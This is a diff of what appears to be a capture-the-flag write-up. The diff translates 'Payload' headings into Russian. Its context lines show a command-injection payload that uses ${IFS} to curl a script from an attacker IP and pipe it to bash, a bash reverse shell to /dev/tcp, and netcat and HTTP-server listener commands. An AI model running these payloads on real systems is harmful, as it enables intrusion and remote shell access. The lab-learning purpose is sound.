@@ -23,7 +23,7 @@
 
 Command Injection (${IFS})
 ├── rev.sh: bash -i >& /dev/tcp/10.10.14.177/4444 0>&1
-├── Payload: test;curl${IFS}http://10.10.14.177:7000/rev.sh|bash;
+├── Полезная нагрузка: test;curl${IFS}http://10.10.14.177:7000/rev.sh|bash;
 └── shell от app
 
 Утечка Учётных Данных (JAR → PostgreSQL)
@@ -124,7 +124,7 @@ python3 -m http.server 7000
 nc -lvnp 4444
 ```
 
-Payload:
+Полезная нагрузка:
 
 ```
 test;curl${IFS}http://10.10.14.177:7000/rev.sh|bash;
